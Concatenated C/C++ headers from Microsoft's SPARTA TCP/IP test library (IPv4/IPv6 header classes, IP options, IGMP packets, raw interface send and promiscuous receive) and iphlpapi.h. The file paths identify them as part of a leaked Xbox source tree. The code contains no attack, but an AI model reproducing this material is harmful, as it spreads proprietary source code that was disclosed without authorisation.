#define IP6_PROTOCOL_V6        41  // IPv6 Header.
#define IP6_PROTOCOL_ROUTING   43  // IPv6 Routing Header.
#define IP6_PROTOCOL_FRAGMENT  44  // IPv6 Fragment Header.
#define IP6_PROTOCOL_ESP       50  // IPSec Encapsulating Security Payload Hdr.
#define IP6_PROTOCOL_AH        51  // IPSec Authentication Hdr.
#define IP6_PROTOCOL_ICMPv6    58  // IPv6 Internet Control Message Protocol.
#define IP6_PROTOCOL_NONE      59  // No next header - ignore packet remainder.
#define IP6_PROTOCOL_DEST_OPTS 60  // IPv6 Destination Options Header.

#define MAX_EXTENSION_HEADERS  16
#define MAX_SIZE_IPV6_STRING   40

#ifndef   IPv6Addr
typedef struct in6_addr IPv6Addr;
#endif

typedef struct IPv6Header IPv6Header;

#define IVP6BASEHEADERLENGTH sizeof(IPv6Header)


struct UpperLayerHeader
{
   IPv6Addr    SrcAddr;
   IPv6Addr    DestAddr;
   USHORT      usPacketLength;
   USHORT      usProtocol;
};


//////////////////////////////////////////////////////////////////////////
// forward references
//////////////////////////////////////////////////////////////////////////

class CIPv6OptionsHeader;
class CIPv6RoutingHeader;
class CIPv6FragmentHeader;
class CIPv6ESPHeader;
class CIPv6AuthentHeader;

class CIPv6ExtensionHeader;


/////////////////////////////////////////////////
// definition of the class that combines the ipv4 header and the ipv6 header
/////////////////////////////////////////////////

class CIPHeader
{
   friend class CIPPacket;

   // Shared internal vars
   // TRUE for ipv6, false for ipv4
   BOOL        m_IsVersion6;
   BOOL        m_autoCalcDatagramLength;
   // This buffer will have the pvData memeber field pointed to the ip structure
   PKT_BUFFER  m_IPHeader;    // we want access to these members from the IPPacket class
   PVOID       m_pvBuffer;    // handy reference to actual header data in m_IPHeader


   // ipv4-specific internal vars
   // True if the ip header contains ip options
   BOOL  m_IsOptionDefined;
   BOOL  m_autoAlignOptions;
   BOOL  m_autoCalcHdrLength;
   BOOL  m_autoCalcChecksum;
   BOOL  m_checkAligned;

   // ipv6-specific
   BOOL  m_UsesDefaultOrder;
   BOOL  m_UsesRandomOrder;
   ULONG m_NextHeaderIndex;

protected:
   // ipv4-specific vars
   // list of ip options
   CIPOption *m_ipOptionList[100];
   // number of IP Options
   DWORD m_nIPOptions;

   VOID OrderIpv6ExtHeaders();

public:
   // ipv6 variables...
   CIPv6OptionsHeader   *m_HopByHopHeader;
   CIPv6RoutingHeader   *m_RoutingHeader;
   CIPv6OptionsHeader   *m_IntermedDestOptionsHeader;
   CIPv6FragmentHeader  *m_FragmentHeader;
   CIPv6AuthentHeader   *m_AuthentHeader;
   CIPv6ESPHeader       *m_ESPHeader;
   CIPv6OptionsHeader   *m_FinalDestOptionsHeader;
   CIPv6ExtensionHeader *m_ExtensionHeaders[MAX_EXTENSION_HEADERS];

   // Default Constructor
   CIPHeader(BOOL fIsVersion6 = FALSE);
        
   // used by ICMP header
   CIPHeader(PVOID rawBuffer, DWORD actualSize, DWORD maxSize, BOOL fIsVersion6 = FALSE);

   // create a MEDIA header buffer from raw data, part of the parsing API
   // dwBytesRead will return the number of bytes used for the header
   CIPHeader(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead, BOOL fIsVersion6 = FALSE);
    
   ~CIPHeader();

   //
   // Functions to get values from the header itself -- common to ipv4 and ipv6
   //
   UCHAR          GetVersion();
   UCHAR          GetProtocolType();

   //
   // get header values specific to ipv4
   //
   UCHAR    GetHdrLength();
   UCHAR    GetTOS();
   USHORT   GetDatagramLength();
   USHORT   GetID();
   USHORT   GetFlag();
   USHORT   GetFragOffset();
   UCHAR    GetTTL();
   USHORT   GetChecksum();
   ULONG    GetSrcAddr();     // NETWORK byte order
   ULONG    GetDestAddr();    // NETWORK byte order

   //
   // get header values specific to ipv6
   //
   UCHAR          GetTrafficClass();
   ULONG          GetFlowLabel();
   USHORT         GetLength();
   UCHAR          GetNextHeader();
   UCHAR          GetHopLimit();
   SPARTA_STATUS  GetSrcAddr(IPv6Addr *pIp6Addr);
   SPARTA_STATUS  GetDestAddr(IPv6Addr *pIp6Addr);

   //
   // Functions to set values in the header itself -- common to ipv4 and ipv6
   //
   SPARTA_STATUS  SetVersion(UCHAR version);

   //
   // set header values specific to ipv4
   //
   SPARTA_STATUS  SetHdrLength(UCHAR hdrLength);
   SPARTA_STATUS  SetTOS(UCHAR tos);
   SPARTA_STATUS  SetDatagramLength(USHORT datagramlen);
   SPARTA_STATUS  SetID(USHORT ID);
   SPARTA_STATUS  SetFlag(USHORT Flag);
   SPARTA_STATUS  SetFragOffset(USHORT FragOffset);
   SPARTA_STATUS  SetTTL(UCHAR ttl);
   SPARTA_STATUS  SetProtocolType(UCHAR type);
   SPARTA_STATUS  SetChecksum(USHORT chksum);
   SPARTA_STATUS  SetSrcAddr(ULONG ip);      // NETWORK byte order
   SPARTA_STATUS  SetDestAddr(ULONG ip);     // NETWORK byte order

   //
   // set header values specific to ipv6
   //
   SPARTA_STATUS  SetTrafficClass(UCHAR ucTrafficClass);
   SPARTA_STATUS  SetFlowLabel(ULONG ulFlowLabel);
   SPARTA_STATUS  SetLength(USHORT usLength);
   SPARTA_STATUS  SetNextHeader(UCHAR ucNextHeader);
   SPARTA_STATUS  SetHopLimit(UCHAR ucHopLimit);
   SPARTA_STATUS  SetSrcAddr(IPv6Addr *pIp6Addr);
   SPARTA_STATUS  SetDestAddr(IPv6Addr *pIp6Addr);
   SPARTA_STATUS  SetSrcAddr(TCHAR *pAddr)
   {
      return SetSrcAddr(inet_addr(pAddr));
   }
   SPARTA_STATUS  SetDestAddr(TCHAR *pAddr)
   {
      return SetDestAddr(inet_addr(pAddr));
   }

   //
   // other functions that are common to ipv6 and ipv6
   //
   DWORD          GetActualHeaderLength();
   DWORD          GetActualDatagramLength();
   ULONG          GetPseudoChecksum(const USHORT Length);
   SPARTA_STATUS  PreparePacketForSend();
   SPARTA_STATUS  SetAutoCalcDatagramLength(BOOL flag);
   PKT_BUFFER     GetRawBuffer();
   PVOID          GetRawBufferData();
   SPARTA_STATUS  SetRawBuffer(PKT_BUFFER buffer);
   void           Print();

   //
   // functions specific for ipv4
   //
   SPARTA_STATUS     ConstructIPOptions(PVOID pvRawData, 
                                        DWORD dwBytesRemaining, 
                                        OUT PDWORD pdwBytesRead);
   SPARTA_STATUS     ChainIPOptions();
   CIPOptionsVector  *GetIPOptions();
   SPARTA_STATUS     GetIPOptionLength(DWORD * length);
   SPARTA_STATUS     AddIPOptions(CIPOption *ipOption,DWORD *dwOptionBUsed);
   CIPOption         *CreateIPOption(UCHAR opType);
   BOOL              IsOptionPresent();
   DWORD             GetNumberOfOptions();
   SPARTA_STATUS     RemoveALLIPOptions();
   SPARTA_STATUS     AutoAlignOptions(BOOL alignOptions);
   SPARTA_STATUS     SetAutoCalcChecksum(BOOL flag);
   USHORT            CalcChecksum();
   SPARTA_STATUS     SetAutoCalcHeaderLength(BOOL flag);
   static CPattern *CreateSrcIPAddressPattern(MAC_MEDIA_TYPE MediaType,ULONG sIpAdd);  // NETWORK byte order
   static CPattern *CreateDestIPAddressPattern(MAC_MEDIA_TYPE MediaType,ULONG dIpAdd); // NETWORK byte order
   static CPattern *CreateSrcIPAddressPattern(MAC_MEDIA_TYPE MediaType, TCHAR *pAddr)
   {
      return CreateSrcIPAddressPattern(MediaType, inet_addr(pAddr));
   }
   static CPattern *CreateDestIPAddressPattern(MAC_MEDIA_TYPE MediaType, TCHAR *pAddr)
   {
      return CreateDestIPAddressPattern(MediaType, inet_addr(pAddr));
   }

   //
   // functions specific for ipv6
   //
   SPARTA_STATUS  CreateHopByHopHeader();
   SPARTA_STATUS  CreateRoutingHeader();
   SPARTA_STATUS  CreateIntermediateDestinationOptionsHeader();
   SPARTA_STATUS  CreateFragmentHeader();
   SPARTA_STATUS  CreateAuthenticationHeader();
   SPARTA_STATUS  CreateESPHeader();
   SPARTA_STATUS  CreateFinalDestinationOptionsHeader();
   SPARTA_STATUS  AddHopByHopHeader();
   SPARTA_STATUS  AddRoutingHeader();
   SPARTA_STATUS  AddDestinationOptionsHeader();
   SPARTA_STATUS  AddFragmentHeader();
   SPARTA_STATUS  AddAuthenticationHeader();
   SPARTA_STATUS  AddESPHeader();
   static CPattern *CreateSrcIPAddressPattern(MAC_MEDIA_TYPE MediaType, IPv6Addr *psIpAdd);
   static CPattern *CreateDestIPAddressPattern(MAC_MEDIA_TYPE MediaType, IPv6Addr *pdIpAdd);

   BOOL  IsVersion6()
   {
      return m_IsVersion6;
   }

   BOOL IsWellOrdered()
   {
      if (m_IsVersion6 && (m_UsesDefaultOrder || (m_NextHeaderIndex == 0)))
      {
         return TRUE;
      }
      return FALSE;
   }

   short NumExtHeaders();

   //
   // static conversion functions
   //
   static SPARTA_STATUS Ipv6AddressToString(IPv6Addr *pAddr, TCHAR *strAddr, PULONG BufLength);
   static SPARTA_STATUS StringToIpv6Address(TCHAR *strAddr, IPv6Addr *pAddr);
   static SPARTA_STATUS MulticastAddressForIpv6(IPv6Addr *pAddr, TCHAR *strAddr, PULONG BufLength);

   //
   // NOTE:  expects address in NETWORK byt order
   //
   static SPARTA_STATUS Ipv4AddressToString(ULONG Addr, TCHAR *strAddr, PULONG BufLength);

   //
   // NOTE:  returns NETWORK byte ordering!
   //
   static ULONG   StringToIpv4Address(TCHAR *pAddr)
   {
      return inet_addr(pAddr);
   }
};

#endif // __SPARTA_MACHEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\iphlpapi.h ===
/*++

Copyright (c) 1997-1999  Microsoft Corporation

Module Name:

    public\sdk\inc\iphlpapi.h

Abstract:
    Header file for functions to interact with the IP Stack for MIB-II and
    related functionality

Revision History:
    Amritansh Raghav    Created
    NK Srinivas         Added

--*/

#ifndef __IPHLPAPI_H__
#define __IPHLPAPI_H__

#if _MSC_VER > 1000
#pragma once
#endif

#ifdef __cplusplus
extern "C" {
#endif

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// IPRTRMIB.H has the definitions of the strcutures used to set and get     //
// information                                                              //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

#include <iprtrmib.h>
#include <ipexport.h>
#include <iptypes.h>

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// The GetXXXTable APIs take a buffer and a size of buffer.  If the buffer  //
// is not large enough, they APIs return ERROR_INSUFFICIENT_BUFFER  and     //
// *pdwSize is the required buffer size                                     //
// The bOrder is a BOOLEAN, which if TRUE sorts the table according to      //
// MIB-II (RFC XXXX)                                                        //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Retrieves the number of interfaces in the system. These include LAN and  //
// WAN interfaces                                                           //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////


DWORD
WINAPI
GetNumberOfInterfaces(
    OUT PDWORD  pdwNumIf
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets the MIB-II ifEntry                                                  //
// The dwIndex field of the MIB_IFROW should be set to the index of the     //
// interface being queried                                                  //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetIfEntry(
    IN OUT PMIB_IFROW   pIfRow
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets the MIB-II IfTable                                                  //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetIfTable(
    OUT    PMIB_IFTABLE pIfTable,
    IN OUT PULONG       pdwSize,
    IN     BOOL         bOrder
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets the Interface to IP Address mapping                                 //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetIpAddrTable(
    OUT    PMIB_IPADDRTABLE pIpAddrTable,
    IN OUT PULONG           pdwSize,
    IN     BOOL             bOrder
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets the current IP Address to Physical Address (ARP) mapping            //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetIpNetTable(
    OUT    PMIB_IPNETTABLE pIpNetTable,
    IN OUT PULONG          pdwSize,
    IN     BOOL            bOrder
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets the IP Routing Table  (RFX XXXX)                                    //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetIpForwardTable(
    OUT    PMIB_IPFORWARDTABLE pIpForwardTable,
    IN OUT PULONG              pdwSize,
    IN     BOOL                bOrder
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets TCP Connection/UDP Listener Table                                   //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetTcpTable(
    OUT    PMIB_TCPTABLE pTcpTable,
    IN OUT PDWORD        pdwSize,
    IN     BOOL          bOrder
    );

DWORD
WINAPI
GetUdpTable(
    OUT    PMIB_UDPTABLE pUdpTable,
    IN OUT PDWORD        pdwSize,
    IN     BOOL          bOrder
    );


//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets IP/ICMP/TCP/UDP Statistics                                          //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetIpStatistics(
    OUT  PMIB_IPSTATS   pStats
    );

DWORD
WINAPI
GetIcmpStatistics(
    OUT PMIB_ICMP   pStats
    );


DWORD
WINAPI
GetTcpStatistics(
    OUT PMIB_TCPSTATS   pStats
    );

DWORD
WINAPI
GetUdpStatistics(
    OUT PMIB_UDPSTATS   pStats
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Used to set the ifAdminStatus on an interface.  The only fields of the   //
// MIB_IFROW that are relevant are the dwIndex (index of the interface      //
// whose status needs to be set) and the dwAdminStatus which can be either  //
// MIB_IF_ADMIN_STATUS_UP or MIB_IF_ADMIN_STATUS_DOWN                       //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
SetIfEntry(
    IN PMIB_IFROW pIfRow
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Used to create, modify or delete a route.  In all cases the              //
// dwForwardIfIndex, dwForwardDest, dwForwardMask, dwForwardNextHop and     //
// dwForwardPolicy MUST BE SPECIFIED. Currently dwForwardPolicy is unused   //
// and MUST BE 0.                                                           //
// For a set, the complete MIB_IPFORWARDROW structure must be specified     //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
CreateIpForwardEntry(
    IN PMIB_IPFORWARDROW pRoute
    );

DWORD
WINAPI
SetIpForwardEntry(
    IN PMIB_IPFORWARDROW pRoute
    );

DWORD
WINAPI
DeleteIpForwardEntry(
    IN PMIB_IPFORWARDROW pRoute
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Used to set the ipForwarding to ON or OFF (currently only ON->OFF is     //
// allowed) and to set the defaultTTL.  If only one of the fields needs to  //
// be modified and the other needs to be the same as before the other field //
// needs to be set to MIB_USE_CURRENT_TTL or MIB_USE_CURRENT_FORWARDING as  //
// the case may be                                                          //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////


DWORD
WINAPI
SetIpStatistics(
    IN PMIB_IPSTATS pIpStats
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Used to set the defaultTTL.                                              //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
SetIpTTL(
    UINT nTTL
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Used to create, modify or delete an ARP entry.  In all cases the dwIndex //
// dwAddr field MUST BE SPECIFIED.                                          //
// For a set, the complete MIB_IPNETROW structure must be specified         //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
CreateIpNetEntry(
    IN PMIB_IPNETROW    pArpEntry
    );

DWORD
WINAPI
SetIpNetEntry(
    IN PMIB_IPNETROW    pArpEntry
    );

DWORD
WINAPI
DeleteIpNetEntry(
    IN PMIB_IPNETROW    pArpEntry
    );

DWORD
WINAPI
FlushIpNetTable(
    IN DWORD   dwIfIndex
    );


//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Used to create or delete a Proxy ARP entry. The dwIndex is the index of  //
// the interface on which to PARP for the dwAddress.  If the interface is   //
// of a type that doesnt support ARP, e.g. PPP, then the call will fail     //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
CreateProxyArpEntry(
    IN  DWORD   dwAddress,
    IN  DWORD   dwMask,
    IN  DWORD   dwIfIndex
    );

DWORD
WINAPI
DeleteProxyArpEntry(
    IN  DWORD   dwAddress,
    IN  DWORD   dwMask,
    IN  DWORD   dwIfIndex
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Used to set the state of a TCP Connection. The only state that it can be //
// set to is MIB_TCP_STATE_DELETE_TCB.  The complete MIB_TCPROW structure   //
// MUST BE SPECIFIED                                                        //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
SetTcpEntry(
    IN PMIB_TCPROW pTcpRow
    );


DWORD
WINAPI
GetInterfaceInfo(
    IN PIP_INTERFACE_INFO pIfTable,
    OUT PULONG            dwOutBufLen
    );

DWORD
WINAPI
GetUniDirectionalAdapterInfo(OUT PIP_UNIDIRECTIONAL_ADAPTER_ADDRESS pIPIfInfo,
                 OUT PULONG dwOutBufLen
                 );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets the "best" outgoing interface for the specified destination address //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetBestInterface(
    IN  IPAddr  dwDestAddr,
    OUT PDWORD  pdwBestIfIndex
    );

//////////////////////////////////////////////////////////////////////////////
//                                                                          //
// Gets the best (longest matching prefix) route for the given destination  //
// If the source address is also specified (i.e. is not 0x00000000), and    //
// there are multiple "best" routes to the given destination, the returned  //
// route will be one that goes out over the interface which has an address  //
// that matches the source address                                          //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

DWORD
WINAPI
GetBestRoute(
    IN  DWORD               dwDestAddr,
    IN  DWORD               dwSourceAddr, OPTIONAL
    OUT PMIB_IPFORWARDROW   pBestRoute
    );

DWORD
WINAPI
NotifyAddrChange(
    OUT PHANDLE      Handle,
    IN  LPOVERLAPPED overlapped
    );


DWORD
WINAPI
NotifyRouteChange(
    OUT PHANDLE      Handle,
    IN  LPOVERLAPPED overlapped
    );


DWORD
WINAPI
GetAdapterIndex(
    IN LPWSTR  AdapterName,
    OUT PULONG IfIndex
    );

DWORD
WINAPI
AddIPAddress(
    IPAddr  Address,
    IPMask  IpMask,
    DWORD   IfIndex,
    PULONG  NTEContext,
    PULONG  NTEInstance
    );

DWORD
WINAPI
DeleteIPAddress(
    ULONG NTEContext
    );

DWORD
WINAPI
GetNetworkParams(
    PFIXED_INFO pFixedInfo, PULONG pOutBufLen
    );

DWORD
WINAPI
GetAdaptersInfo(
    PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen
    );

DWORD
WINAPI
GetPerAdapterInfo(
    ULONG IfIndex, PIP_PER_ADAPTER_INFO pPerAdapterInfo, PULONG pOutBufLen
    );

DWORD
WINAPI
IpReleaseAddress(
    PIP_ADAPTER_INDEX_MAP  AdapterInfo
    );


DWORD
WINAPI
IpRenewAddress(
    PIP_ADAPTER_INDEX_MAP  AdapterInfo
    );

DWORD
WINAPI
SendARP(
    IPAddr DestIP,
    IPAddr SrcIP,
    PULONG pMacAddr,
    PULONG  PhyAddrLen
    );

BOOL
WINAPI
GetRTTAndHopCount(
    IPAddr DestIpAddress,
    PULONG HopCount,
    ULONG  MaxHops,
    PULONG RTT
    );

DWORD
WINAPI
GetFriendlyIfIndex(
    DWORD IfIndex
    );

DWORD
WINAPI
EnableRouter(
    HANDLE* pHandle,
    OVERLAPPED* pOverlapped
    );

DWORD
WINAPI
UnenableRouter(
    OVERLAPPED* pOverlapped,
    LPDWORD lpdwEnableCount OPTIONAL
    );

#ifdef __cplusplus
}
#endif

#endif //__IPHLPAPI_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\igmppacketv2.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: IGMPPacket.hpp                                                               *
* Description: this defines the Packet class for IGMP Packets, extends the CIPPacket class*
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      5/22/2000    created                               *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IGMPV2_PACKET_H__
#define __SPARTA_IGMPV2_PACKET_H__

#include "sparta.h"
#include "IGMPHeaderV2.hpp"
#include "IPPacket.hpp"

class CIGMPPacketV2 : public CIPPacket
{
public:
    CIGMPHeaderV2 &IGMPHeaderV2;

    CIGMPPacketV2(MAC_MEDIA_TYPE MediaType,UCHAR igmpType);
    CIGMPPacketV2(PKT_PACKET Packet, CMacHeader &MacHeaderParam, CIPHeader &IPHeader,CIGMPHeaderV2 &IGMPHeaderV2);
    virtual ~CIGMPPacketV2();

    int GetPacketType();
	virtual SPARTA_STATUS PreparePacketForSend();

    virtual void PrintPacket();
};

#endif // __SPARTA_IGMPV2_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\interface.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: Interface.hpp                                                               *
* Description: this defines the Interface class used in the driver API                  *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/21/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_INTERFACE_H__
#define __SPARTA_INTERFACE_H__

#include "sparta.h"
#include "driverapi.h"
#include "Packet.hpp"
#include "Pattern.hpp"
#include "MacPacket.hpp"
#include "ReceiveTimer.hpp"

class CInterfaceList
{
protected:
    TCHAR **m_pszInterfaceNames;
    DWORD m_dwInterfaceCount;

public:
    CInterfaceList();
    ~CInterfaceList();
    DWORD GetCount();
    TCHAR *GetNameAt(DWORD dwIndex);
};


class CInterface
{
protected:
    NI_INTERFACE m_Interface;
    MAC_MEDIA_TYPE m_MediaType;
    CMacAddress *m_pMediaAddress;

    // we share the send and receive buffers for this interface.
    // we could make it asyncronous and do a memory allocation
    // for each send and receive. The SPARTA driver
    // uses asynchronous I/O so all that needs to be changed are the
    // methods in the interface class, as well adding NI_AsyncSend and NI_AsyncReceive
    // in the driver API functions

    CRITICAL_SECTION m_csSendBufferCriticalSection;
    PVOID m_pvSendBuffer;
    DWORD m_dwSendBufferLength;
    DWORD m_dwLastBufferSendLength;

    CRITICAL_SECTION m_csReceiveBufferCriticalSection;
    PVOID m_pvReceiveBuffer;
    DWORD m_dwReceiveBufferLength;
    DWORD m_ReceiveMode;

    CInterface( const CInterface& )    //  Private copy constructor.
    {
        DEBUGMSG(DBG_SPARTA_DRIVERAPI,
            (TEXT("** DON'T LIKE COPY CONSTRUCTOR ****** CInterface::CInterface[]\n")
            ));

    }

public:
    CInterface(const TCHAR *szDescription);
    ~CInterface();

    #if DBG
    // for testing only !!
    NI_INTERFACE GetInterfaceHandle()
    {
        return m_Interface;
    }
    #endif

    MAC_MEDIA_TYPE GetMediaType();

    CMacAddress *GetMediaAddress();

    SPARTA_STATUS Send(CPacket *SendPacket);
    SPARTA_STATUS Send(CPacket &SendPacket);
    SPARTA_STATUS ReSendLastPacket();
    // use ResendLastPacket for higher performance i.e. where identical buffers
    // are sent numerous times. The performance increase is marginal, but this was
    // supplied for completeness sake.

    SPARTA_STATUS SendRawBuffer(PVOID pvBuffer, DWORD dwBufferLength);

    // use SendRawBuffer for performance reasons - the Send command will assemble
    // all packet headers and call the send handlers for each call. If you want
    // to send repeated copies of the same packet, use Packet::BuildRawBuffer and
    // then send it out using SendRawBuffer

    SPARTA_STATUS EnablePromiscuousReceiveMode();
    SPARTA_STATUS EnableBroadcastReceiveMode();
    SPARTA_STATUS EnableDirectedReceiveMode();
    SPARTA_STATUS EnableMulticastReceiveMode();

    SPARTA_STATUS DisablePromiscuousReceiveMode();
    SPARTA_STATUS DisableBroadcastReceiveMode();
    SPARTA_STATUS DisableDirectedReceiveMode();
    SPARTA_STATUS DisableMulticastReceiveMode();

    // the compiler did not like optional parameters for this call, thus the
    // list of variants for this method

    CPacket *Receive();
    CPacket *Receive(int ExpectedPacketType); // throws error if doesn't receive 
                                                                    // expected packet type
    CPacket *Receive(int ExpectedPacketType, HANDLE hEventHandle); // will return timeout if event set
	CPacket *Receive(CReceiveTimer &Timer);
	CPacket *Receive(int ExpectedPacketType, CReceiveTimer &Timer);
    CPacket *Receive(HANDLE hEventHandle); // will return timeout if event set
                                            // this method is not needed in scripts

    SPARTA_STATUS AddMulticastAddress(CMacAddress &McastAddr);
    SPARTA_STATUS RemoveMulticastAddress(CMacAddress &McastAddr);

    SPARTA_STATUS AddPatternFilter(CPattern &Pattern);
    SPARTA_STATUS RemovePatternFilter(CPattern &Pattern);

    SPARTA_STATUS AddPatternFilter(CPattern *pPattern);
    SPARTA_STATUS RemovePatternFilter(CPattern *pPattern);

    SPARTA_STATUS EnablePatternFiltering();
    SPARTA_STATUS DisablePatternFiltering();

    SPARTA_STATUS StartListening();
    SPARTA_STATUS StopListening();

};


#endif // __SPARTA_INTERFACE_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipoptions.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: IPOptions.hpp                                                               *
* Description: This is the implementation of the IPHeader functions                  *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      4/25/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IPOPTIONS_H__
#define __SPARTA_IPOPTIONS_H__

#include "IPConstants.h"
#include "Packets.h"

class CIPOption
{

   friend class CIPHeader;
   friend class CIPPacket;

   UCHAR m_optionType;
   UCHAR m_TSOptionFlag;
   UCHAR m_IsBufferLengthSet;

protected:

   // This buffer will have the pvData memeber field pointed to the ip options
   PKT_BUFFER m_IPOptions; // we want access to these members from the IPPacket class

public:
        

   PVOID GetRawBuffer();
   // Not implemented yet: not used
   DWORD GetRawBufferLength()
   {
      return 0;
   }
        
   // Not to be exposed through COM
   PKT_BUFFER GetPktBuffer();
    

   // The IP Header is created with the IP Options and the type of the IPOptions is specified
   // as a parameter to the constructor.
   CIPOption(UCHAR IPOptionType);

   // create a Options header buffer from raw data, part of the parsing API
   // dwBytesRead will return the number of bytes used for the header
   CIPOption(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);

   // copy constructor
   CIPOption(CIPOption& ipoption);

   ~CIPOption();

   bool IsOptionUnknown();

   // IPOptions set functions

   SPARTA_STATUS SetOptionType(UCHAR type);

   SPARTA_STATUS SetOptionBufferLength(UCHAR length);

   SPARTA_STATUS SetOptionLength(UCHAR length);

   SPARTA_STATUS SetOptionOffset(UCHAR offset);

   SPARTA_STATUS SetTSOverFlowFlag(UCHAR  oflag);
        
   SPARTA_STATUS SetTSFlag(UCHAR flag);

   SPARTA_STATUS SetIPAddrAt(UCHAR offset,const TCHAR * IP)
   {
      return SetIPAddrAt(offset, inet_addr(IP));
   }

   SPARTA_STATUS SetIPAddrAt(UCHAR offset,DWORD IP);     // address in NETWORK byte order


   SPARTA_STATUS SetTimeStampAt(UCHAR offset,unsigned long tstamp);


   // get functions

   UCHAR GetOptionType();


   UCHAR GetOptionBufferLength();

   UCHAR GetOptionLength();

   UCHAR  GetOptionOffset();


   UCHAR  GetTSOverFlowFlag();
        
   UCHAR  GetTSFlag();


   DWORD  GetIPAddrAt(UCHAR offset);   // address in NETWORK byte order

   ULONG GetTimeStampAt(UCHAR offset);


   void    Print();

};

#endif //__SPARTA_IPOPTIONS_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipconstants.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: IPConstants.h                                                               *
* Description: This is the implementation of the IPHeader functions                  *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      4/25/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IPCONSTANTS_H__
#define __SPARTA_IPCONSTANTS_H__

#define ETHERNET_802_3_HEADER_LENGTH 14

#define LONGEST_POSSIBLE_IP_HEADER         60
#define IP_HEADER_LENGTH_WITOUT_OPTIONS    20
#define IPV4_ADDRESS_LENGTH                 4
#define IPV4_SOURCE_ADDRESS_OFFSET         12
#define IPV4_DESTINATION_ADDRESS_OFFSET    16

#define IPV6_ADDRESS_BYTES                 16      //IPV6_ADDRESS_LENGTH defined in ip6.h (in bits)
#define IPV6_SOURCE_ADDRESS_OFFSET          8
#define IPV6_DESTINATION_ADDRESS_OFFSET    24

typedef enum
{
    OFF = 0,
    ON,
} AUTO_CAL_TYPES;

// The type field of the various ip options as stored in the
